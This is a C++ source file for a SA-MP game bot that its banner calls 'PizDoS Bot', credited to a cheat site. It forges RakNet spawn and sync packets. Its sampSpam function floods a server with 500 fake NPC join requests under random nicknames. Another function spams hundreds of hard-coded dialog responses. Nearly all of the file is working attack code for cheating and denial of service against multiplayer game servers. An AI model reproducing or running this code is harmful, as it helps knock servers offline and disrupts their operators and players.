#include "main.h"


void sampChanger(int iClass)
{
RakNet::BitStream bsSpawnRequest;
bsSpawnRequest.Write(rand()%7);
RakNet::BitStream bsDeath;
RakNet::BitStream bsSendSpawn;
pRakClient->RPC(&RPC_RequestClass, &bsSpawnRequest, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_RequestSpawn, &bsDeath, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);	
pRakClient->RPC(&RPC_Spawn, &bsSendSpawn, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
char chang[30];
SendMessage(changer, WM_GETTEXT, (WPARAM)512, (LPARAM)chang);
sendChat(chang);
}

// following functions
void onFootUpdateAtNormalPos()
{
	ONFOOT_SYNC_DATA ofSync;
	memset(&ofSync, 0, sizeof(ONFOOT_SYNC_DATA));
	ofSync.byteHealth = 100;
	ofSync.fQuaternion[3] = settings.fNormalModeRot;
	ofSync.vecPos[0] = settings.fNormalModePos[0];
	ofSync.vecPos[1] = settings.fNormalModePos[1];
	ofSync.vecPos[2] = settings.fNormalModePos[2];
	SendOnFootFullSyncData(&ofSync, 0, -1);

	AIM_SYNC_DATA aimSync;
	memset(&aimSync, 0, sizeof(AIM_SYNC_DATA));
	aimSync.byteCamMode = 4;
	aimSync.vecAimf1[1] = 0.25f;
	SendAimSyncData(&aimSync, 0, 0, -1);
}

void onFootUpdateFollow(PLAYERID followID)
{
	ONFOOT_SYNC_DATA ofSync;
	memset(&ofSync, 0, sizeof(ONFOOT_SYNC_DATA));
	SendOnFootFullSyncData(&ofSync, 0, followID);

	AIM_SYNC_DATA aimSync;
	memset(&aimSync, 0, sizeof(AIM_SYNC_DATA));
	SendAimSyncData(&aimSync, 0, 0, followID);
}

void onFootUpdateFollow1(PLAYERID followID)
{
	ONFOOT_SYNC_DATA ofSync;
	memset(&ofSync, 0, sizeof(ONFOOT_SYNC_DATA));
	SendOnFootFullSyncData1(&ofSync, 0, followID);

	AIM_SYNC_DATA aimSync;
	memset(&aimSync, 0, sizeof(AIM_SYNC_DATA));
	SendAimSyncData(&aimSync, 0, 0, followID);
}

void onFootUpdateFollow2(PLAYERID followID)
{
	ONFOOT_SYNC_DATA ofSync;
	memset(&ofSync, 0, sizeof(ONFOOT_SYNC_DATA));
	SendOnFootFullSyncData2(&ofSync, 0, followID);

	AIM_SYNC_DATA aimSync;
	memset(&aimSync, 0, sizeof(AIM_SYNC_DATA));
	SendAimSyncData(&aimSync, 0, 0, followID);
}

void onFootUpdateFollow3(PLAYERID followID)
{
	ONFOOT_SYNC_DATA ofSync;
	memset(&ofSync, 0, sizeof(ONFOOT_SYNC_DATA));
	SendOnFootFullSyncData3(&ofSync, 0, followID);

	AIM_SYNC_DATA aimSync;
	memset(&aimSync, 0, sizeof(AIM_SYNC_DATA));
	SendAimSyncData(&aimSync, 0, 0, followID);
}

void onFootUpdateFollow4(PLAYERID followID)
{
	ONFOOT_SYNC_DATA ofSync;
	memset(&ofSync, 0, sizeof(ONFOOT_SYNC_DATA));
	SendOnFootFullSyncData4(&ofSync, 0, followID);

	AIM_SYNC_DATA aimSync;
	memset(&aimSync, 0, sizeof(AIM_SYNC_DATA));
	SendAimSyncData(&aimSync, 0, 0, followID);
}

void onFootUpdateFollow5(PLAYERID followID)
{
	ONFOOT_SYNC_DATA ofSync;
	memset(&ofSync, 0, sizeof(ONFOOT_SYNC_DATA));
	SendOnFootFullSyncData5(&ofSync, 0, followID);

	AIM_SYNC_DATA aimSync;
	memset(&aimSync, 0, sizeof(AIM_SYNC_DATA));
	SendAimSyncData(&aimSync, 0, 0, followID);
}

DWORD inCarUpdateTick = GetTickCount();
void inCarUpdateFollow(PLAYERID followID, VEHICLEID withVehicleID)
{
	if(playerInfo[g_myPlayerID].iAreWeInAVehicle)
	{
		INCAR_SYNC_DATA icSync;
		memset(&icSync, 0, sizeof(INCAR_SYNC_DATA));
		icSync.VehicleID = withVehicleID;
		SendInCarFullSyncData(&icSync, 0, followID);

		AIM_SYNC_DATA aimSync;
		memset(&aimSync, 0, sizeof(AIM_SYNC_DATA));
		SendAimSyncData(&aimSync, 0, 0, followID);
	}
	

	if(inCarUpdateTick && inCarUpdateTick < (GetTickCount() - 10000))
	{
		if(!playerInfo[g_myPlayerID].iAreWeInAVehicle)
		{
			if(playerInfo[followID].incarData.VehicleID == (VEHICLEID)-1)
				return;

			SendEnterVehicleNotification((VEHICLEID)settings.iFollowingWithVehicleID, 0);
			playerInfo[g_myPlayerID].iAreWeInAVehicle = 1;
			inCarUpdateTick = 0;
		}

		inCarUpdateTick = GetTickCount();
	}
	else
	{
		if(!playerInfo[g_myPlayerID].iAreWeInAVehicle)
			onFootUpdateFollow(followID);
	}
}

int sampConnect(char *szHostname, int iPort, char *szNickname, char *szPassword, RakClientInterface *pRakClient)
{
	static bool started = false;
	
	    if (!started)
        {
	        started = true;
	        Log("============================================================");
			Log("=========================PizDoS Bot=========================");
			Log("======================www.cheat.samp-users.ru======================");
			Log("======================Made by : AlexDrift====================");
			Log("======================Private Edition v2.0======================");
			Log("===========Моему наследнику [B][E][N][D][E][R] aka Fox===============");
	    }
	if (!iAreWeConnected) Log("Подключение по %s:%d", szHostname, iPort);

	strcpy(g_szNickName, szNickname);
	if(pRakClient == NULL) return 0;

	pRakClient->SetPassword(szPassword);
	return (int)pRakClient->Connect(szHostname, iPort, 0, 0, 5);
}

void sampDisconnect(int iTimeout)
{
	if(pRakClient == NULL) return;

	Log("Отключение");

	if(iTimeout)
		pRakClient->Disconnect(0);
	else
		pRakClient->Disconnect(500);
}

void sampRequestClass(int iClass)
{
	if(pRakClient == NULL) return;
	//Log("Requesting class %d...", iClass);

	RakNet::BitStream bsSpawnRequest;
	bsSpawnRequest.Write(iClass);
	pRakClient->RPC(&RPC_RequestClass, &bsSpawnRequest, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
}

void sampSpawn()
{
	
}

DWORD spamTimeDisconnect = GetTickCount();
DWORD spamTimeSpam = GetTickCount();
void sampSpam()
{
	for(int ccflood = 0; ccflood < 500;ccflood++)
	{
			char nick[15] = {0};
			gen_random(nick, 15);

			RakNet::BitStream bsSend;
			char *pszAuthBullshit = AUTH_BS;
			int iVersion = NETGAME_VERSION;
			BYTE byteMod = 1;
			BYTE byteNameLen = (BYTE)strlen(nick);
			BYTE byteAuthBSLen = (BYTE)strlen(pszAuthBullshit);
			unsigned int uiClientChallengeResponse = playerInfo->uiChallenge ^ iVersion;
	
			bsSend.Write(iVersion);
			bsSend.Write(byteMod);
			bsSend.Write(byteNameLen);
			bsSend.Write(nick, byteNameLen);
			bsSend.Write(uiClientChallengeResponse);
			bsSend.Write(byteAuthBSLen);
			bsSend.Write(pszAuthBullshit, byteAuthBSLen);
			pRakClient->RPC(&RPC_NPCJoin, &bsSend, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
	}
}

void test()
{
int i;
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);
tests3(i);  
}

void test24()
{
if(pRakClient == NULL) return;
sendDialogResponse(sampDialog.wDialogID, 1, 1, "");
sendDialogResponse(sampDialog.wDialogID, 2, 2, "");
sendDialogResponse(sampDialog.wDialogID, 3, 3, "");
sendDialogResponse(sampDialog.wDialogID, 4, 4, "");
sendDialogResponse(sampDialog.wDialogID, 5, 5, "");
sendDialogResponse(sampDialog.wDialogID, 6, 6, "");
sendDialogResponse(sampDialog.wDialogID, 7, 7, "");
sendDialogResponse(sampDialog.wDialogID, 8, 8, "");
sendDialogResponse(sampDialog.wDialogID, 9, 9, "");
sendDialogResponse(sampDialog.wDialogID, 0, 0, "");
sendDialogResponse(sampDialog.wDialogID, 11, 11, "");
sendDialogResponse(sampDialog.wDialogID, 12, 12, "");
sendDialogResponse(sampDialog.wDialogID, 13, 13, "");
sendDialogResponse(sampDialog.wDialogID, 14, 14, "");
sendDialogResponse(sampDialog.wDialogID, 15, 15, "");
sendDialogResponse(sampDialog.wDialogID, 16, 16, "");
sendDialogResponse(sampDialog.wDialogID, 17, 17, "");
sendDialogResponse(sampDialog.wDialogID, 18, 18, "");
sendDialogResponse(sampDialog.wDialogID, 19, 19, "");
sendDialogResponse(sampDialog.wDialogID, 20, 20, "");
sendDialogResponse(sampDialog.wDialogID, 21, 21, "");
sendDialogResponse(sampDialog.wDialogID, 22, 22, "");
sendDialogResponse(sampDialog.wDialogID, 23, 23, "");
sendDialogResponse(sampDialog.wDialogID, 24, 24, "");
sendDialogResponse(sampDialog.wDialogID, 25, 25, "");
sendDialogResponse(sampDialog.wDialogID, 26, 26, "");
sendDialogResponse(sampDialog.wDialogID, 1, 1, "");
sendDialogResponse(sampDialog.wDialogID, 2, 2, "");
sendDialogResponse(sampDialog.wDialogID, 3, 3, "");
sendDialogResponse(sampDialog.wDialogID, 4, 4, "");
sendDialogResponse(sampDialog.wDialogID, 5, 5, "");
sendDialogResponse(sampDialog.wDialogID, 6, 6, "");
sendDialogResponse(sampDialog.wDialogID, 7, 7, "");
sendDialogResponse(sampDialog.wDialogID, 8, 8, "");
sendDialogResponse(sampDialog.wDialogID, 9, 9, "");
sendDialogResponse(sampDialog.wDialogID, 0, 0, "");
sendDialogResponse(sampDialog.wDialogID, 11, 11, "");
sendDialogResponse(sampDialog.wDialogID, 12, 12, "");
sendDialogResponse(sampDialog.wDialogID, 13, 13, "");
sendDialogResponse(sampDialog.wDialogID, 14, 14, "");
sendDialogResponse(sampDialog.wDialogID, 15, 15, "");
sendDialogResponse(sampDialog.wDialogID, 16, 16, "");
sendDialogResponse(sampDialog.wDialogID, 17, 17, "");
sendDialogResponse(sampDialog.wDialogID, 18, 18, "");
sendDialogResponse(sampDialog.wDialogID, 19, 19, "");
sendDialogResponse(sampDialog.wDialogID, 20, 20, "");
sendDialogResponse(sampDialog.wDialogID, 21, 21, "");
sendDialogResponse(sampDialog.wDialogID, 22, 22, "");
sendDialogResponse(sampDialog.wDialogID, 23, 23, "");
sendDialogResponse(sampDialog.wDialogID, 24, 24, "");
sendDialogResponse(sampDialog.wDialogID, 25, 25, "");
sendDialogResponse(sampDialog.wDialogID, 26, 26, "");
sendDialogResponse(sampDialog.wDialogID, 1, 1, "");
sendDialogResponse(sampDialog.wDialogID, 2, 2, "");
sendDialogResponse(sampDialog.wDialogID, 3, 3, "");
sendDialogResponse(sampDialog.wDialogID, 4, 4, "");
sendDialogResponse(sampDialog.wDialogID, 5, 5, "");
sendDialogResponse(sampDialog.wDialogID, 6, 6, "");
sendDialogResponse(sampDialog.wDialogID, 7, 7, "");
sendDialogResponse(sampDialog.wDialogID, 8, 8, "");
sendDialogResponse(sampDialog.wDialogID, 9, 9, "");
sendDialogResponse(sampDialog.wDialogID, 0, 0, "");
sendDialogResponse(sampDialog.wDialogID, 11, 11, "");
sendDialogResponse(sampDialog.wDialogID, 12, 12, "");
sendDialogResponse(sampDialog.wDialogID, 13, 13, "");
sendDialogResponse(sampDialog.wDialogID, 14, 14, "");
sendDialogResponse(sampDialog.wDialogID, 15, 15, "");
sendDialogResponse(sampDialog.wDialogID, 16, 16, "");
sendDialogResponse(sampDialog.wDialogID, 17, 17, "");
sendDialogResponse(sampDialog.wDialogID, 18, 18, "");
sendDialogResponse(sampDialog.wDialogID, 19, 19, "");
sendDialogResponse(sampDialog.wDialogID, 20, 20, "");
sendDialogResponse(sampDialog.wDialogID, 21, 21, "");
sendDialogResponse(sampDialog.wDialogID, 22, 22, "");
sendDialogResponse(sampDialog.wDialogID, 23, 23, "");
sendDialogResponse(sampDialog.wDialogID, 24, 24, "");
sendDialogResponse(sampDialog.wDialogID, 25, 25, "");
sendDialogResponse(sampDialog.wDialogID, 26, 26, "");
sendDialogResponse(sampDialog.wDialogID, 1, 1, "");
sendDialogResponse(sampDialog.wDialogID, 2, 2, "");
sendDialogResponse(sampDialog.wDialogID, 3, 3, "");
sendDialogResponse(sampDialog.wDialogID, 4, 4, "");
sendDialogResponse(sampDialog.wDialogID, 5, 5, "");
sendDialogResponse(sampDialog.wDialogID, 6, 6, "");
sendDialogResponse(sampDialog.wDialogID, 7, 7, "");
sendDialogResponse(sampDialog.wDialogID, 8, 8, "");
sendDialogResponse(sampDialog.wDialogID, 9, 9, "");
sendDialogResponse(sampDialog.wDialogID, 0, 0, "");
sendDialogResponse(sampDialog.wDialogID, 11, 11, "");
sendDialogResponse(sampDialog.wDialogID, 12, 12, "");
sendDialogResponse(sampDialog.wDialogID, 13, 13, "");
sendDialogResponse(sampDialog.wDialogID, 14, 14, "");
sendDialogResponse(sampDialog.wDialogID, 15, 15, "");
sendDialogResponse(sampDialog.wDialogID, 16, 16, "");
sendDialogResponse(sampDialog.wDialogID, 17, 17, "");
sendDialogResponse(sampDialog.wDialogID, 18, 18, "");
sendDialogResponse(sampDialog.wDialogID, 19, 19, "");
sendDialogResponse(sampDialog.wDialogID, 20, 20, "");
sendDialogResponse(sampDialog.wDialogID, 21, 21, "");
sendDialogResponse(sampDialog.wDialogID, 22, 22, "");
sendDialogResponse(sampDialog.wDialogID, 23, 23, "");
sendDialogResponse(sampDialog.wDialogID, 24, 24, "");
sendDialogResponse(sampDialog.wDialogID, 25, 25, "");
sendDialogResponse(sampDialog.wDialogID, 26, 26, "");
sendDialogResponse(sampDialog.wDialogID, 199, 199, "");
sendDialogResponse(sampDialog.wDialogID, 399, 399, "");
sendDialogResponse(sampDialog.wDialogID, 499, 499, "");
sendDialogResponse(sampDialog.wDialogID, 599, 511, "");
sendDialogResponse(sampDialog.wDialogID, 611, 611, "");
sendDialogResponse(sampDialog.wDialogID, 711, 711, "");
sendDialogResponse(sampDialog.wDialogID, 811, 811, "");
sendDialogResponse(sampDialog.wDialogID, 911, 911, "");
sendDialogResponse(sampDialog.wDialogID, 0, 0, "");
sendDialogResponse(sampDialog.wDialogID, 111, 111, "");
sendDialogResponse(sampDialog.wDialogID, 121, 121, "");
sendDialogResponse(sampDialog.wDialogID, 131, 131, "");
sendDialogResponse(sampDialog.wDialogID, 141, 141, "");
sendDialogResponse(sampDialog.wDialogID, 151, 11, "");
sendDialogResponse(sampDialog.wDialogID, 161, 161, "");
sendDialogResponse(sampDialog.wDialogID, 171, 171, "");
sendDialogResponse(sampDialog.wDialogID, 181, 11, "");
sendDialogResponse(sampDialog.wDialogID, 191, 191, "");
sendDialogResponse(sampDialog.wDialogID, 201, 201, "");
sendDialogResponse(sampDialog.wDialogID, 211, 211, "");
sendDialogResponse(sampDialog.wDialogID, 221, 221, "");
sendDialogResponse(sampDialog.wDialogID, 231, 231, "");
sendDialogResponse(sampDialog.wDialogID, 241, 241, "");
sendDialogResponse(sampDialog.wDialogID, 251, 251, "");
sendDialogResponse(sampDialog.wDialogID, 261, 261, "");
sendDialogResponse(sampDialog.wDialogID, 199, 199, "");
sendDialogResponse(sampDialog.wDialogID, 299, 299, "");
sendDialogResponse(sampDialog.wDialogID, 399, 399, "");
sendDialogResponse(sampDialog.wDialogID, 499, 499, "");
sendDialogResponse(sampDialog.wDialogID, 599, 511, "");
sendDialogResponse(sampDialog.wDialogID, 611, 611, "");
sendDialogResponse(sampDialog.wDialogID, 711, 711, "");
sendDialogResponse(sampDialog.wDialogID, 811, 811, "");
sendDialogResponse(sampDialog.wDialogID, 911, 911, "");
sendDialogResponse(sampDialog.wDialogID, 0, 0, "");
sendDialogResponse(sampDialog.wDialogID, 111, 111, "");
sendDialogResponse(sampDialog.wDialogID, 121, 121, "");
sendDialogResponse(sampDialog.wDialogID, 131, 131, "");
sendDialogResponse(sampDialog.wDialogID, 141, 141, "");
sendDialogResponse(sampDialog.wDialogID, 151, 11, "");
sendDialogResponse(sampDialog.wDialogID, 161, 161, "");
sendDialogResponse(sampDialog.wDialogID, 171, 171, "");
sendDialogResponse(sampDialog.wDialogID, 181, 11, "");
sendDialogResponse(sampDialog.wDialogID, 191, 191, "");
sendDialogResponse(sampDialog.wDialogID, 201, 201, "");
sendDialogResponse(sampDialog.wDialogID, 211, 211, "");
sendDialogResponse(sampDialog.wDialogID, 221, 221, "");
sendDialogResponse(sampDialog.wDialogID, 231, 231, "");
sendDialogResponse(sampDialog.wDialogID, 241, 241, "");
sendDialogResponse(sampDialog.wDialogID, 251, 251, "");
sendDialogResponse(sampDialog.wDialogID, 261, 261, "");
sendDialogResponse(sampDialog.wDialogID, 199, 199, "");
sendDialogResponse(sampDialog.wDialogID, 299, 299, "");
sendDialogResponse(sampDialog.wDialogID, 399, 399, "");
sendDialogResponse(sampDialog.wDialogID, 499, 499, "");
sendDialogResponse(sampDialog.wDialogID, 599, 511, "");
sendDialogResponse(sampDialog.wDialogID, 611, 611, "");
sendDialogResponse(sampDialog.wDialogID, 711, 711, "");
sendDialogResponse(sampDialog.wDialogID, 811, 811, "");
sendDialogResponse(sampDialog.wDialogID, 911, 911, "");
sendDialogResponse(sampDialog.wDialogID, 0, 0, "");
sendDialogResponse(sampDialog.wDialogID, 111, 111, "");
sendDialogResponse(sampDialog.wDialogID, 121, 121, "");
sendDialogResponse(sampDialog.wDialogID, 131, 131, "");
sendDialogResponse(sampDialog.wDialogID, 141, 141, "");
sendDialogResponse(sampDialog.wDialogID, 151, 11, "");
sendDialogResponse(sampDialog.wDialogID, 161, 161, "");
sendDialogResponse(sampDialog.wDialogID, 171, 171, "");
sendDialogResponse(sampDialog.wDialogID, 181, 11, "");
sendDialogResponse(sampDialog.wDialogID, 191, 191, "");
sendDialogResponse(sampDialog.wDialogID, 201, 201, "");
sendDialogResponse(sampDialog.wDialogID, 211, 211, "");
sendDialogResponse(sampDialog.wDialogID, 221, 221, "");
sendDialogResponse(sampDialog.wDialogID, 231, 231, "");
sendDialogResponse(sampDialog.wDialogID, 241, 241, "");
sendDialogResponse(sampDialog.wDialogID, 251, 251, "");
sendDialogResponse(sampDialog.wDialogID, 261, 261, "");
sendDialogResponse(sampDialog.wDialogID, 27, 27, "");
sendDialogResponse(sampDialog.wDialogID, 28, 28, "");
sendDialogResponse(sampDialog.wDialogID, 37, 37, "");
sendDialogResponse(sampDialog.wDialogID, 47, 47, "");
sendDialogResponse(sampDialog.wDialogID, 57, 57, "");
sendDialogResponse(sampDialog.wDialogID, 67, 67, "");
sendDialogResponse(sampDialog.wDialogID, 77, 77, "");
sendDialogResponse(sampDialog.wDialogID, 87, 87, "");
sendDialogResponse(sampDialog.wDialogID, 97, 97, "");
sendDialogResponse(sampDialog.wDialogID, 0, 0, "");
sendDialogResponse(sampDialog.wDialogID, 117, 117, "");
sendDialogResponse(sampDialog.wDialogID, 127, 127, "");
sendDialogResponse(sampDialog.wDialogID, 137, 137, "");
sendDialogResponse(sampDialog.wDialogID, 147, 147, "");
sendDialogResponse(sampDialog.wDialogID, 157, 157, "");
sendDialogResponse(sampDialog.wDialogID, 167, 167, "");
sendDialogResponse(sampDialog.wDialogID, 177, 177, "");
sendDialogResponse(sampDialog.wDialogID, 187, 187, "");
sendDialogResponse(sampDialog.wDialogID, 191, 191, "");
sendDialogResponse(sampDialog.wDialogID, 201, 201, "");
sendDialogResponse(sampDialog.wDialogID, 211, 211, "");
sendDialogResponse(sampDialog.wDialogID, 221, 221, "");
sendDialogResponse(sampDialog.wDialogID, 231, 231, "");
sendDialogResponse(sampDialog.wDialogID, 241, 241, "");
sendDialogResponse(sampDialog.wDialogID, 251, 251, "");
sendDialogResponse(sampDialog.wDialogID, 261, 261, "");
sendDialogResponse(sampDialog.wDialogID, 27, 27, "");
sendDialogResponse(sampDialog.wDialogID, 28, 28, "");
sendDialogResponse(sampDialog.wDialogID, 37, 37, "");
sendDialogResponse(sampDialog.wDialogID, 47, 47, "");
sendDialogResponse(sampDialog.wDialogID, 57, 57, "");
sendDialogResponse(sampDialog.wDialogID, 67, 67, "");
sendDialogResponse(sampDialog.wDialogID, 77, 77, "");
sendDialogResponse(sampDialog.wDialogID, 87, 87, "");
sendDialogResponse(sampDialog.wDialogID, 97, 97, "");
sendDialogResponse(sampDialog.wDialogID, 0, 0, "");
sendDialogResponse(sampDialog.wDialogID, 117, 117, "");
sendDialogResponse(sampDialog.wDialogID, 127, 127, "");
sendDialogResponse(sampDialog.wDialogID, 137, 137, "");
sendDialogResponse(sampDialog.wDialogID, 147, 147, "");
sendDialogResponse(sampDialog.wDialogID, 157, 157, "");
sendDialogResponse(sampDialog.wDialogID, 167, 167, "");
sendDialogResponse(sampDialog.wDialogID, 177, 177, "");
sendDialogResponse(sampDialog.wDialogID, 187, 187, "");
sendDialogResponse(sampDialog.wDialogID, 191, 191, "");
sendDialogResponse(sampDialog.wDialogID, 201, 201, "");
sendDialogResponse(sampDialog.wDialogID, 211, 211, "");
sendDialogResponse(sampDialog.wDialogID, 221, 221, "");
sendDialogResponse(sampDialog.wDialogID, 231, 231, "");
sendDialogResponse(sampDialog.wDialogID, 241, 241, "");
sendDialogResponse(sampDialog.wDialogID, 251, 251, "");
sendDialogResponse(sampDialog.wDialogID, 261, 261, "");
sendDialogResponse(sampDialog.wDialogID, 27, 27, "");
sendDialogResponse(sampDialog.wDialogID, 28, 28, "");
sendDialogResponse(sampDialog.wDialogID, 37, 37, "");
sendDialogResponse(sampDialog.wDialogID, 47, 47, "");
sendDialogResponse(sampDialog.wDialogID, 57, 57, "");
sendDialogResponse(sampDialog.wDialogID, 67, 67, "");
sendDialogResponse(sampDialog.wDialogID, 77, 77, "");
sendDialogResponse(sampDialog.wDialogID, 87, 87, "");
sendDialogResponse(sampDialog.wDialogID, 97, 97, "");
sendDialogResponse(sampDialog.wDialogID, 0, 0, "");
sendDialogResponse(sampDialog.wDialogID, 117, 117, "");
sendDialogResponse(sampDialog.wDialogID, 127, 127, "");
sendDialogResponse(sampDialog.wDialogID, 137, 137, "");
sendDialogResponse(sampDialog.wDialogID, 147, 147, "");
sendDialogResponse(sampDialog.wDialogID, 157, 157, "");
sendDialogResponse(sampDialog.wDialogID, 167, 167, "");
sendDialogResponse(sampDialog.wDialogID, 177, 177, "");
sendDialogResponse(sampDialog.wDialogID, 187, 187, "");
sendDialogResponse(sampDialog.wDialogID, 191, 191, "");
sendDialogResponse(sampDialog.wDialogID, 201, 201, "");
sendDialogResponse(sampDialog.wDialogID, 211, 211, "");
sendDialogResponse(sampDialog.wDialogID, 221, 221, "");
sendDialogResponse(sampDialog.wDialogID, 231, 231, "");
sendDialogResponse(sampDialog.wDialogID, 241, 241, "");
sendDialogResponse(sampDialog.wDialogID, 251, 251, "");
sendDialogResponse(sampDialog.wDialogID, 261, 261, "");
sendDialogResponse(sampDialog.wDialogID, 27, 27, "");
sendDialogResponse(sampDialog.wDialogID, 28, 28, "");
sendDialogResponse(sampDialog.wDialogID, 37, 37, "");
sendDialogResponse(sampDialog.wDialogID, 47, 47, "");
sendDialogResponse(sampDialog.wDialogID, 57, 57, "");
sendDialogResponse(sampDialog.wDialogID, 67, 67, "");
sendDialogResponse(sampDialog.wDialogID, 77, 77, "");
sendDialogResponse(sampDialog.wDialogID, 87, 87, "");
sendDialogResponse(sampDialog.wDialogID, 97, 97, "");
sendDialogResponse(sampDialog.wDialogID, 0, 0, "");
sendDialogResponse(sampDialog.wDialogID, 117, 117, "");
sendDialogResponse(sampDialog.wDialogID, 127, 127, "");
sendDialogResponse(sampDialog.wDialogID, 137, 137, "");
sendDialogResponse(sampDialog.wDialogID, 147, 147, "");
sendDialogResponse(sampDialog.wDialogID, 157, 157, "");
sendDialogResponse(sampDialog.wDialogID, 167, 167, "");
sendDialogResponse(sampDialog.wDialogID, 177, 177, "");
sendDialogResponse(sampDialog.wDialogID, 187, 187, "");
sendDialogResponse(sampDialog.wDialogID, 191, 191, "");
sendDialogResponse(sampDialog.wDialogID, 201, 201, "");
sendDialogResponse(sampDialog.wDialogID, 211, 211, "");
sendDialogResponse(sampDialog.wDialogID, 221, 221, "");
sendDialogResponse(sampDialog.wDialogID, 231, 231, "");
sendDialogResponse(sampDialog.wDialogID, 241, 241, "");
sendDialogResponse(sampDialog.wDialogID, 251, 251, "");
sendDialogResponse(sampDialog.wDialogID, 261, 261, "");
sendDialogResponse(sampDialog.wDialogID, 27, 27, "");
sendDialogResponse(sampDialog.wDialogID, 28, 28, "");
sendDialogResponse(sampDialog.wDialogID, 37, 37, "");
sendDialogResponse(sampDialog.wDialogID, 47, 47, "");
sendDialogResponse(sampDialog.wDialogID, 57, 57, "");
sendDialogResponse(sampDialog.wDialogID, 67, 67, "");
sendDialogResponse(sampDialog.wDialogID, 77, 77, "");
sendDialogResponse(sampDialog.wDialogID, 87, 87, "");
sendDialogResponse(sampDialog.wDialogID, 97, 97, "");
sendDialogResponse(sampDialog.wDialogID, 0, 0, "");
sendDialogResponse(sampDialog.wDialogID, 117, 117, "");
sendDialogResponse(sampDialog.wDialogID, 127, 127, "");
sendDialogResponse(sampDialog.wDialogID, 137, 137, "");
sendDialogResponse(sampDialog.wDialogID, 147, 147, "");
sendDialogResponse(sampDialog.wDialogID, 157, 157, "");
sendDialogResponse(sampDialog.wDialogID, 167, 167, "");
sendDialogResponse(sampDialog.wDialogID, 177, 177, "");
sendDialogResponse(sampDialog.wDialogID, 187, 187, "");
sendDialogResponse(sampDialog.wDialogID, 191, 191, "");
sendDialogResponse(sampDialog.wDialogID, 201, 201, "");
sendDialogResponse(sampDialog.wDialogID, 211, 211, "");
sendDialogResponse(sampDialog.wDialogID, 221, 221, "");
sendDialogResponse(sampDialog.wDialogID, 231, 231, "");
sendDialogResponse(sampDialog.wDialogID, 241, 241, "");
sendDialogResponse(sampDialog.wDialogID, 251, 251, "");
sendDialogResponse(sampDialog.wDialogID, 261, 261, "");
sendDialogResponse(sampDialog.wDialogID, 1, 1, "");
sendDialogResponse(sampDialog.wDialogID, 2, 2, "");
sendDialogResponse(sampDialog.wDialogID, 3, 3, "");
sendDialogResponse(sampDialog.wDialogID, 4, 4, "");
sendDialogResponse(sampDialog.wDialogID, 5, 5, "");
sendDialogResponse(sampDialog.wDialogID, 6, 6, "");
sendDialogResponse(sampDialog.wDialogID, 7, 7, "");
sendDialogResponse(sampDialog.wDialogID, 8, 8, "");
sendDialogResponse(sampDialog.wDialogID, 9, 9, "");
sendDialogResponse(sampDialog.wDialogID, 0, 0, "");
sendDialogResponse(sampDialog.wDialogID, 11, 11, "");
sendDialogResponse(sampDialog.wDialogID, 12, 12, "");
sendDialogResponse(sampDialog.wDialogID, 13, 13, "");
sendDialogResponse(sampDialog.wDialogID, 14, 14, "");
sendDialogResponse(sampDialog.wDialogID, 15, 15, "");
sendDialogResponse(sampDialog.wDialogID, 16, 16, "");
sendDialogResponse(sampDialog.wDialogID, 17, 17, "");
sendDialogResponse(sampDialog.wDialogID, 18, 18, "");
sendDialogResponse(sampDialog.wDialogID, 19, 19, "");
sendDialogResponse(sampDialog.wDialogID, 20, 20, "");
sendDialogResponse(sampDialog.wDialogID, 21, 21, "");
sendDialogResponse(sampDialog.wDialogID, 22, 22, "");
sendDialogResponse(sampDialog.wDialogID, 23, 23, "");
sendDialogResponse(sampDialog.wDialogID, 24, 24, "");
sendDialogResponse(sampDialog.wDialogID, 25, 25, "");
sendDialogResponse(sampDialog.wDialogID, 26, 26, "");
sendDialogResponse(sampDialog.wDialogID, 1, 1, "");
sendDialogResponse(sampDialog.wDialogID, 2, 2, "");
sendDialogResponse(sampDialog.wDialogID, 3, 3, "");
sendDialogResponse(sampDialog.wDialogID, 4, 4, "");
sendDialogResponse(sampDialog.wDialogID, 5, 5, "");
sendDialogResponse(sampDialog.wDialogID, 6, 6, "");
sendDialogResponse(sampDialog.wDialogID, 7, 7, "");
sendDialogResponse(sampDialog.wDialogID, 8, 8, "");
sendDialogResponse(sampDialog.wDialogID, 9, 9, "");
sendDialogResponse(sampDialog.wDialogID, 0, 0, "");
sendDialogResponse(sampDialog.wDialogID, 11, 11, "");
sendDialogResponse(sampDialog.wDialogID, 12, 12, "");
sendDialogResponse(sampDialog.wDialogID, 13, 13, "");
sendDialogResponse(sampDialog.wDialogID, 14, 14, "");
sendDialogResponse(sampDialog.wDialogID, 15, 15, "");
sendDialogResponse(sampDialog.wDialogID, 16, 16, "");
sendDialogResponse(sampDialog.wDialogID, 17, 17, "");
sendDialogResponse(sampDialog.wDialogID, 18, 18, "");
sendDialogResponse(sampDialog.wDialogID, 19, 19, "");
sendDialogResponse(sampDialog.wDialogID, 20, 20, "");
sendDialogResponse(sampDialog.wDialogID, 21, 21, "");
sendDialogResponse(sampDialog.wDialogID, 22, 22, "");
sendDialogResponse(sampDialog.wDialogID, 23, 23, "");
sendDialogResponse(sampDialog.wDialogID, 24, 24, "");
sendDialogResponse(sampDialog.wDialogID, 25, 25, "");
sendDialogResponse(sampDialog.wDialogID, 26, 26, "");
sendDialogResponse(sampDialog.wDialogID, 1, 1, "");
sendDialogResponse(sampDialog.wDialogID, 2, 2, "");
sendDialogResponse(sampDialog.wDialogID, 3, 3, "");
sendDialogResponse(sampDialog.wDialogID, 4, 4, "");
sendDialogResponse(sampDialog.wDialogID, 5, 5, "");
sendDialogResponse(sampDialog.wDialogID, 6, 6, "");
sendDialogResponse(sampDialog.wDialogID, 7, 7, "");
sendDialogResponse(sampDialog.wDialogID, 8, 8, "");
sendDialogResponse(sampDialog.wDialogID, 9, 9, "");
sendDialogResponse(sampDialog.wDialogID, 0, 0, "");
sendDialogResponse(sampDialog.wDialogID, 11, 11, "");
sendDialogResponse(sampDialog.wDialogID, 12, 12, "");
